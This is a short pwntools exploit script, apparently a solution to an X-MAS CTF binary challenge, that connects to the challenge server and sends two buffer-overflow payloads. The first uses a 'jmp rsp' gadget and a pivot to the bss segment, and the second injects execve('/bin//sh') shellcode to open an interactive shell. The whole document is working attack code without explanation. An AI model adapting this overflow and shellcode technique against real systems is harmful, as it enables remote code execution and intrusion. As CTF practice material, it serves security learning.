from pwn import *
r=remote("challs.xmas.htsp.ro",2000)
#r=process("./chall")
b=ELF("./chall")
libc=ELF("./libc.so.6")
context.log_level='debug'
shellcode=b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
bss=0x601050+0x900
prdi=0x00400743
main=0x400637
fgets=0x00000000040067B

pay=b'x'*0x2e
pay+=b'\xff\xe4'
pay+=p64(bss+0x30)
pay+=p64(fgets)
r.sendlineafter("\n",pay)

pay2=shellcode.ljust(0x2e,b'\x00')
pay2+=b'\xff\xe4'
pay2+=b'x'*8
pay2+=p64(bss)
r.sendlineafter("\n",pay2)
r.interactive()